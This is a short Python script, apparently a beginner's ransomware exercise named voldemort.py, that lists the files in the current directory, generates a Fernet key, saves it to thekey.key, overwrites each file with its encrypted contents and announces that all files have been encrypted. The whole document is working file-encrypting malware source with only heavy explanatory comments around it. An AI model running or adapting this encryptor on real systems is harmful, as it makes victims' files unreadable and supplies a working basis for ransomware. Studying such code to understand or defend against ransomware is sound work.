import os
from cryptography.fernet import Fernet

# finding the files

files = []

for file in os.listdir():
    # to exclude these files from being encrypted
    if file == ".idea" or file == "voldemort.py" or file == "thekey.key" or file == "harry.py":
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()

# opening a file called thekey.key(ig if it doesn't find a file named thekey.key it'll crate one automatically)
# in write binary mode and calling it as thekey
with open("thekey.key", "wb") as thekey:
    # thekey is actually thekey.key as mentioned above.
    # so, now we write the key into the thekey.key file
    thekey.write(key)

# going through all the files, i.e, boat.txt, etc.
for file in files:
    # opening boat.txt in read binary mode and calling boat.txt as "thefile" now
    # remember that file is also boat.txt now
    with open(file, "rb") as thefile:
        # contents is now boat.txt
        contents = thefile.read()
        # contents_encrypted is now the boat.txt file encrypted with the key
        contents_encrypted = Fernet(key).encrypt(contents)

    # opening boat.txt in wb as thefile
    with open(file, "wb") as thefile:
        # overwriting the contents of boat.txt with contents_encrypted
        thefile.write(contents_encrypted)

print("yo, all your files have been encrypted!")


